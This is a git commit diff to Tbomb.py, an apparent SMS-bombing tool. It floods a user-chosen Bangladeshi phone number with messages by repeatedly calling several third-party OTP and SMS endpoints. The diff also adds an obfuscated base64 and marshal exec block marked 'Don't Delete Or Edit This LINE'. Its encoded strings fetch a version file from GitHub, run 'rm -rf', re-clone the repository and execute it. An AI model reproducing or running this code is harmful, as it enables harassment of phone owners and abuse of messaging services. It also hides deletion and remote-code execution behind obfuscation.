4aa4527d68c17bb97799c31cde95410cf5afc716
HunterSl4d3 <modasserhasan@yahoo.com>
2021-12-15 22:53:38 +0600

    Update Tbomb.py

--- Tbomb.py
+++ Tbomb.py
@@ -2,8 +2,6 @@
 #################################################################################
 # Coded By HunterSl4d3
 # A Product Of ToxicNoob
-# If You Want To Get Knowledge From This  Source Code, You're Welcomed....
-# But If You Want To Copy And Take Cradits, Then Get Out...
 # https://github.com/Toxic-Noob/
 #################################################################################
 
@@ -28,19 +26,21 @@ def psb(z):
         sys.stdout.flush()
         time.sleep(0.03)
 
-def cheak_limit():
+def check_limit():
 	oj = str(op)
-	print("\033[92;3m["+oj+"] Massage Sent Successfully.")
+	print("\033[92m	["+oj+"] Massage Sent Successfully.")
 	if(op==tr):
-		psb("\n[*] Bombing Finished Successfully..")
+		psb("\n	[*] Bombing Finished Successfully..")
 		time.sleep(0.4)
-		psb("[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber..\n\033[0;40;37m")
+		psb("	[!] Sent "+tr2+" Massages To 0"+number+" By ToxicBomber..\n\033[0;40;37m")
 		exit()
+		sys.exit()
 	else:
 		time.sleep(4)
         
 # Don't Delete Or Edit This LINE
-exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmltcG9ydCBvcwppbXBvcnQgc3lzCgpkZWYgcHNibG9nbyh6KToKICAgIGZvciBlIGluIHogKyAnXG4nOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDAzKQpkZWYgcHNibG9nKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykKCm9zLnN5c3RlbSgiY2xlYXIiKQpwc2Jsb2dvKCJcMDMzWzkybSBfX19fXyAgICAgICAgIF8gICAgICBfICAgXyAgICAgICAgICAgICBfICAgICBcbnxfICAgX3xfX19fICBfKF8pIF9fX3wgXCB8IHwgX19fICAgX19fIHwgfF9fICBcbiAgfCB8LyBfIFwgXC8gLyB8LyBfX3wgIFx8IHwvIF8gXCAvIF8gXHwgJ18gXCBcbiAgfCB8IChfKSA+ICA8fCB8IChfX3wgfFwgIHwgKF8pIHwgKF8pIHwgfF8pIHxcbiAgfF98XF9fXy9fL1xfXF98XF9fX3xffCBcX3xcX19fLyBcX19fL3xfLl9fLyBcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiKQp0aW1lLnNsZWVwKDAuNikKcHNibG9nKCJcMDMzWzAzbVxuXHRbKl0gUGxlYXNlIENvbm5lY3QgVG8gVGhlIEludGVybmV0Li4uIikKcHNibG9nKCJcdFsqXSBDaGVja2luZyBBY2Nlc3MuLi4iKQp2ZXJtYWluID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVG94aWMtTm9vYi9Ub3hpY0JvbWJlci9tYWluLy52ZXJzaW9uLnR4dCIpCnZlcm1haW4gPSB2ZXJtYWluLnRleHQKdmVybm93ID0gb3BlbigiLnZlcnNpb24udHh0IiwgInIiKQp2ZXJub3cgPSB2ZXJub3cucmVhZCgpCnNlY3VyaXR5X2NvZGUgPSB2ZXJtYWluCnNlY3VyaXR5X0szWSA9IHZlcm5vdwo='))
+import base64
+exec(base64.b64decode('IyBFbmNvZGVkIEJ5IFB5RW5jcnlwdG9yCiMgQSBQcm9kdWN0IE9mIFRveGljTm9vYgojIGh0dHBzOi8vZ2l0aHViLmNvbS9Ub3hpYy1Ob29iCgppbXBvcnQgbWFyc2hhbApleGVjKG1hcnNoYWwubG9hZHMoYiJceGUzXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDZceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwc1x4ZmFceDAwXHgwMFx4MDBkXHgwMGRceDAxbFx4MDBaXHgwMGRceDAwZFx4MDFsXHgwMVpceDAxZFx4MDBkXHgwMWxceDAyWlx4MDJkXHgwMGRceDAxbFx4MDNaXHgwM2RceDAyZFx4MDNceDg0XHgwMFpceDA0ZFx4MDRkXHgwNVx4ODRceDAwWlx4MDVlXHgwMlx4YTBceDA2ZFx4MDZceGExXHgwMVx4MDFceDAwZVx4MDRkXHgwN1x4ODNceDAxXHgwMVx4MDBlXHgwMVx4YTBceDA3ZFx4MDhceGExXHgwMVx4MDFceDAwZVx4MDRkXHRceDgzXHgwMVx4MDFceDAwZVx4MDFceGEwXHgwN2Rcblx4YTFceDAxXHgwMVx4MDBlXHgwNWRceDBiXHg4M1x4MDFceDAxXHgwMGVceDA1ZFx4MGNceDgzXHgwMVx4MDFceDAwZVx4MDBceGEwXHgwOGRcclx4YTFceDAxWlx0ZVx0alxuWlx0elx4MDdlXHgwYmRceDBlZFx4MGZceDgzXHgwMlpceDBjV1x4MDBuLFx4MDFceDAwXHgwMVx4MDBceDAxXHgwMGVceDA1ZFx4MTBceDgzXHgwMVx4MDFceDAwZVx4MDVkXHgxMVx4ODNceDAxXHgwMVx4MDBlXHJkXHgxMlx4ODNceDAxWlx4MGVlXHgwNWRceDEzXHg4M1x4MDFceDAxXHgwMGVceDAyXHhhMFx4MDZkXHgxNFx4YTFceDAxXHgwMVx4MDBlXHgwMlx4YTBceDA2ZFx4MTVceGExXHgwMVx4MDFceDAwZVx4MDVkXHgxNlx4ODNceDAxXHgwMVx4MDBlXHgwMVx4YTBceDA3ZFx4MTdceGExXHgwMVx4MDFceDAwZVx4MDJceGEwXHgwNmRceDE4XHhhMVx4MDFceDAxXHgwMFlceDAwZVx4MGNceGEwXHgwZlx4YTFceDAwWlx4MGNlXHRaXHgxMGVceDBjWlx4MTFkXHgwMVNceDAwKVx4MTlceGU5XHgwMFx4MDBceDAwXHgwME5jXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMlx4MDBceDAwXHgwMFx4MDRceDAwXHgwMFx4MDBDXHgwMFx4MDBceDAwXHhmMzJceDAwXHgwMFx4MDB8XHgwMGRceDAxXHgxN1x4MDBEXHgwMF1ceDEyfVx4MDF0XHgwMGpceDAxXHhhMFx4MDJ8XHgwMVx4YTFceDAxXHgwMVx4MDB0XHgwMGpceDAxXHhhMFx4MDNceGExXHgwMFx4MDFceDAwdFx4MDRceGEwXHgwNWRceDAyXHhhMVx4MDFceDAxXHgwMHFceDA0ZFx4MDBTXHgwMClceDAzTlx4ZGFceDAxXG5nXHhmYX5qXHhiY3RceDkzaD9ceGE5XHgwNlx4ZGFceDAzc3lzXHhkYVx4MDZzdGRvdXRceGRhXHgwNXdyaXRlXHhkYVx4MDVmbHVzaFx4ZGFceDA0dGltZVx4ZGFceDA1c2xlZXBceGE5XHgwMlx4ZGFceDAxelx4ZGFceDAxZVx4YTlceDAwclx4MGVceDAwXHgwMFx4MDBceGRhXHgwMFx4ZGFceDA3cHNibG9nb1x4MDZceDAwXHgwMFx4MDBceGYzXG5ceDAwXHgwMFx4MDBceDBjXHgwMVx4MGNceDAxXG5ceDAxXHgwY1x4MDFceDA0XHhmZHJceDEwXHgwMFx4MDBceDAwY1x4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwMFx4MDBceDA0XHgwMFx4MDBceDAwQ1x4MDBceDAwXHgwMHJceDAyXHgwMFx4MDBceDAwKVx4MDNOclx4MDNceDAwXHgwMFx4MDBne1x4MTRceGFlR1x4ZTF6XHg5ND9yXHgwNFx4MDBceDAwXHgwMHJceDBiXHgwMFx4MDBceDAwclx4MGVceDAwXHgwMFx4MDByXHgwZVx4MDBceDAwXHgwMHJceDBmXHgwMFx4MDBceDAwXHhkYVx4MDZwc2Jsb2dceDBiXHgwMFx4MDBceDAwclx4MTFceDAwXHgwMFx4MDByXHgxMlx4MDBceDAwXHgwMFx4ZGFceDA1Y2xlYXJhXHgxZVx4MDFceDAwXHgwMFx4MWJbOTJtIF9fX19fICAgICAgICAgXyAgICAgIF8gICBfICAgICAgICAgICAgIF8gICAgIFxufF8gICBffF9fX18gIF8oXykgX19ffCBcXCB8IHwgX19fICAgX19fIHwgfF9fICBcbiAgfCB8LyBfIFxcIFxcLyAvIHwvIF9ffCAgXFx8IHwvIF8gXFwgLyBfIFxcfCAnXyBcXCBcbiAgfCB8IChfKSA+ICA8fCB8IChfX3wgfFxcICB8IChfKSB8IChfKSB8IHxfKSB8XG4gIHxffFxcX19fL18vXFxfXFxffFxcX19ffF98IFxcX3xcXF9fXy8gXFxfX18vfF8uX18vIFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGUwP3orXHgxYlszOzkwbVx0XHQgICAgU2VjdXJpdHkgSXMgQW4gSWxsdXNpb25ceDFiWzA7OTJtZzMzMzMzM1x4ZTM/eipcbiAgICBbKl0gUGxlYXNlIENvbm5lY3QgVG8gVGhlIEludGVybmV0Li4uelx4MWEgICAgWypdIENoZWNraW5nIEFjY2Vzcy4uLnpKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RveGljLU5vb2IvVG94aWNCb21iZXIvbWFpbi8udmVyc2lvbi50eHR6XHgwYy52ZXJzaW9uLnR4dFx4ZGFceDAxcno0XG4gICAgXHgxYlszMW1bIV0gVGhlcmUgSXMgYSBQcm9ibGVhbSB0byBTdGFydCBUaGUgVG9vbFxuejYgICAgXHgxYls5Mm1bKl0gWW91IEFyZSBBYm91dCBUbyBDbG9uZSBUaGlzIFRvb2wgQWdhaW4uLi56LVxuICAgIFshXSBQcmVzcyBFbnRlciBUbyBTdGFydCBDbG9uaW5nIFRvb2wuLi56IFxuICAgIFshXSBUb29sIENsb25pbmcgU3RhcnRlZC4uLnosY2QgLi4gJiYgcm0gLXJmIFRveGljQm9tYmVyID4gL2Rldi9udWxsIDI+JjF6TWNkIC4uICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vVG94aWMtTm9vYi9Ub3hpY0JvbWJlciA+IC9kZXYvbnVsbCAyPiYxeixcbiAgICBbIV0gQ2xvbmluZyBDb21wbGV0ZWQsIFN0cmF0aW5nIFRvb2wuLi5ceGU5XHgwMVx4MDBceDAwXHgwMHoqY2QgLi4gJiYgY2QgVG94aWNCb21iZXIgJiYgcHl0aG9uIFRib21iLnB5KVx4MTJceGRhXHgwOHJlcXVlc3Rzclx0XHgwMFx4MDBceDAwXHhkYVx4MDJvc3JceDA1XHgwMFx4MDBceDAwclx4MTBceDAwXHgwMFx4MDByXHgxMlx4MDBceDAwXHgwMFx4ZGFceDA2c3lzdGVtclxuXHgwMFx4MDBceDAwXHhkYVx4MDNnZXRaXHgwN3Zlcm1haW5ceGRhXHgwNHRleHRceGRhXHgwNG9wZW5aXHgwNnZlcm5vd1x4ZGFceDA1aW5wdXRceGRhXHgwMm9wXHhkYVx4MDRyZWFkWlxyc2VjdXJpdHlfY29kZVpceDBjc2VjdXJpdHlfSzNZclx4MGVceDAwXHgwMFx4MDByXHgwZVx4MDBceDAwXHgwMHJceDBlXHgwMFx4MDBceDAwclx4MGZceDAwXHgwMFx4MDBceGRhXHgwODxtb2R1bGU+XHgwMVx4MDBceDAwXHgwMHM8XHgwMFx4MDBceDAwXHgwOFx4MDBceDA4XHgwMVx4MDhceDAxXHgwOFx4MDFceDA4XHgwMlx4MDhceDA1XG5ceDA2XHgwOFx4MDFcblx4MDFceDA4XHgwMVxuXHgwMVx4MDhceDAxXHgwOFx4MDFcblx4MDFceDA2XHgwMVx4MDJceDAxXHgwZVx4MDFceDA2XHgwMVx4MDhceDAxXHgwOFx4MDFceDA4XHgwMVx4MDhceDAxXG5ceDAxXG5ceDAxXHgwOFx4MDFcblx4MDFceDBjXHgwMVx4MDhceDAxXHgwNFx4MDFceDA4XHgwMSIpKQ=='))
 
 br = mechanize.Browser()
 br.set_handle_robots(False)
@@ -57,20 +57,19 @@ if(security_code==security_K3Y):
 	logopsb(" _____ ____                  _               \n|_   _| __ )  ___  _ __ ___ | |__   ___ _ __ \n  | | |  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|\n  | | | |_) | (_) | | | | | | |_) |  __/ |   \n  |_| |____/ \___/|_| |_| |_|_.__/ \___|_|   \n                                             ")
 	logopsb("\033[3;90m			A Product Of ToxicNoob\033[0;92m")
 	time.sleep(0.6)
-	logopsb("\033[34m\n|****************************************************|\n|\033[3m Author   : HunterSl4d3                             \033[0;34m|\n|\033[3m Tool     : Toxic Bomber                            \033[0;34m|\n|\033[3m Version  : 2.1                                     \033[0;34m|\n|\033[3m Link     : https://www.github.com/Toxic-Noob/	     \033[0;34m|\n|\033[3m Coded By : HunterSl4d3      		     	     \033[0;34m|\n******************************************************")
+	logopsb("\033[34m\n|****************************************************|\n|\033[3m Author   : ToxicNoob                               \033[0;34m|\n|\033[3m Tool     : Toxic Bomber                            \033[0;34m|\n|\033[3m Version  : 2.2                                     \033[0;34m|\n|\033[3m Link     : https://www.github.com/Toxic-Noob/	     \033[0;34m|\n|\033[3m Coded By : HunterSl4d3      		     	     \033[0;34m|\n******************************************************")
 	time.sleep(0.8)
 	
 	
 	print("\033[92m")
-	number = input("\n\033[3m[*] Enter Target Number:> +880")
-	tr1 = input("[*] Enter Amount (Default 10):> ")
-	if(tr1==""):
+	number = input("\n	[*] Enter Target Number:> ").replace("+880", "").replace("880", "")
+	if (number[0] == "0"):
+	    number = number[-10:]
+	tr = input("	[*] Enter Amount (Default 10):> ")
+	if(tr==""):
 		tr=10
-	else:
-		tr=int(tr1)
-	if("+880" in number):
-		number = number.replace("+880","")
-	psb("[*] Auto Delay: 4 Seconds...")
+	tr = int(tr)
+	psb("	[*] Auto Delay: 4 Seconds...")
 	time.sleep(0.5)
 	
 	num = "880"+number
@@ -83,17 +82,20 @@ if(security_code==security_K3Y):
 	data={"phone":{"number":num3,"internationalNumber":"+880 "+num3,"nationalNumber":"0"+num3,"e164Number":"+880"+num3,"countryCode":"BD","dialCode":"+880"},"contact":num,"type":"phone"}
 	
 	
-	psb("\n[!] Please wait.....")
+	psb("\n	[!] Please wait.....")
 	time.sleep(0.6)
-	psb("[!] Bombing in Progress....\n\n")
+	psb("	[!] Bombing in Progress....\n\n")
 	time.sleep(1)
 	
 	op = 0
 	while op<=tr:
+		if(op==tr):
+			break
+			exit()
 		try:
 			toxic.Bios(num)
 			op=op+1
-			cheak_limit()
+			check_limit()
 		except:
 			if(op==tr):
 				exit()
@@ -101,55 +103,123 @@ if(security_code==security_K3Y):
 				toxic.HN(number)
 				if toxic.HN.res==200:
 					op = op + 1
-					cheak_limit()
+					check_limit()
 				else:
-					print("\033[31m[!] Massege Send Failed!\n")
+					print("\033[31m	[!] Massage Send Failed\n")
 					time.sleep(4)
-	
-		toxic.HN(number)
-		if toxic.HN.res==200:
-			op=op+1
-			cheak_limit()
-		else:
-			print("\033[31m[!] Massege Send Failed!\n")
+					
+		if(op==tr):
+			break
+			exit()
+		try:
+		    toxic.HN(number)
+		    if toxic.HN.res==200:
+		        op=op+1
+		        check_limit()
+		    else:
+		        print("\033[31m	[!] Massege Send Failed!\n")
+		        time.sleep(4)
+		except:
 			time.sleep(4)
-
-		toxic.Double(num2, number)
-		if toxic.Double.res==200:
-			op=op+1
-			cheak_limit()
-		else:
-			toxic.HN(number)
-			if toxic.HN.res==200:
+		        
+		if(op==tr):
+			break
+			exit()
+		try:
+		    toxic.Double(number)
+		    if toxic.Double.res==200:
+		        op=op+1
+		        check_limit()
+		    else:
+		    	toxic.HN(number)
+		    	if toxic.HN.res==200:
+		    		op=op+1
+		    		check_limit()
+		    	else:
+		    		print("\033[31m	[!] Massage Send Failed!\n")
+		    		time.sleep(4)
+		except:
+			time.sleep(4)
+			
+		if(op==tr):
+			break
+			exit()
+		try:
+			toxic.RedX(number)
+			if toxic.RedX.res==200:
 				op=op+1
-				cheak_limit()
+				check_limit()
 			else:
-				print("\033[31m[!] Massage Send Failed!\n")
+				print("\033[31m	[!] Massage Send Failed!\n")
 				time.sleep(4)
-
-		toxic.RedX(number)
-		if toxic.RedX.res==200:
-			op=op+1
-			cheak_limit()
-		else:
-			print("\033[32m[!] Massage Send Failed!\n")
+		except:
 			time.sleep(4)
 
-		toxic.TMS(num2)
-		if toxic.TMS.res==200:
-			op=op+1
-			cheak_limit()
-		else:
-			print("\033[32m[!] Massage Send Failed!")
+		if(op==tr):
+			break
+			exit()
+		try:
+			toxic.TMS(num2)
+			if toxic.TMS.res==200:
+				op=op+1
+				check_limit()
+			else:
+				print("\033[31m	[!] Massage Send Failed!")
+				time.sleep(4)
+		except:
 			time.sleep(4)
 
+		if(op==tr):
+			break
+			exit()
 		try:
 			toxic.BNBD(num)
 			op=op+1
-			cheak_limit()
+			check_limit()
 		except:
-			print("\033[32m[!] Massage Send Failed!")
+			print("\033[31m	[!] Massage Send Failed!")
 			time.sleep(4)
+
+		if(op==tr):
+			break
+			exit()
+		try:
+			toxic.swap(num)
+			if toxic.swap.res==200:
+				op=op+1
+				check_limit()
+			else:
+				print("\033[31m	[!] Massage Send Failed!")
+				time.sleep(4)
+		except:
+			time.sleep(4)
+
+		if(op==tr):
+			break
+			exit()
+		try:
+			toxic.dhamaka(num2)
+			if toxic.dhamaka.res==200:
+				op=op+1
+				check_limit()
+			else:
+				print("\033[31m	[!] Massage Send Failed!")
+				time.sleep(4)
+		except:
+			print("\033[31m	[!0] Massage Send Failed!")
+			time.sleep(4)
+			
+		if(toxic.fun(number)):
+		          op=op+1
+		          check_limit()
+		else:
+			toxic.HN(number)
+			if toxic.HN.res==200:
+					op = op + 1
+					check_limit()
+			else:
+					print("\033[31m	[!] Massege Send Failed!\n")
+					time.sleep(4)
 
 else:
 # Don't Delete Or Edit This LINE
